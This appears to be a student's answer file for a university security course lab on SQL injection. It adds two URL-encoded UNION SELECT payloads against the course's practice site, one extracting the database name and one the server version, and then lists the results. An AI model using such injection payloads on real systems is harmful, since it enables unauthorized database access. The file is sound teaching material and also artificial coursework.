@@ -1,0 +1,5 @@
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+database%28%29%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+%40%40version%23
+
+Name: proj2_xtra_cr3dit
+Version: 5.5.57-0ubuntu0.14.04.1
